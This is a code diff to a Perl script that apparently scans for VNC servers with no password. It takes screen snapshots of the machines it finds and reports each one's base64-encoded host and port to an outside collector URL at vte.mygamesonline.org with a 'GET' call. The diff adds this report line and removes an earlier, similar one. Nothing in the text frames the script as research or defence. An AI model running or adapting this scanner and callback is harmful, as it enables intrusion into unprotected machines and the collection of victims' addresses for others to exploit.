@@ -1,6 +1,6 @@
 #!/usr/bin/perl -w
 #
- 
+ my ($vte);
 use strict;
 use IO::Socket::INET;
  
@@ -36,14 +36,13 @@ if (unpack("H*", $data) =~ /00000001/) {
  
 $client->close();
  use MIME::Base64;
- my $ne = encode_base64("$hostname:$port", '');
+ my $spierdalaj = encode_base64("$hostname:$port", '');
+ my $ne = 'http://vte.mygamesonline.org/dodaj.php?p=vnc&link='.$spierdalaj.'&dork=nie';
 alarm(120);
 if (defined($security)) {
 	warn "[$hostname:$port] Taking snapshot.\n";
 	system("vncsnapshot -vncQuality 7 -quality 70 " . $hostname . ":" . ($port - 5900) . " ./q/" . $hostname . "_" . $port . ".jpg >/dev/null 2>&1");
-	  $vte = 'http://vte.mygamesonline.org/dodaj.php?p=sql_v&link='.$zua.'&dork=nie';
-	   qx!GET $vte!;
-	qx!echo $hostname $port >> quit!;
+	   qx!GET "$ne"!;
 } else {
 	warn "[$hostname:$port] Password required - ignoring.\n";
 }
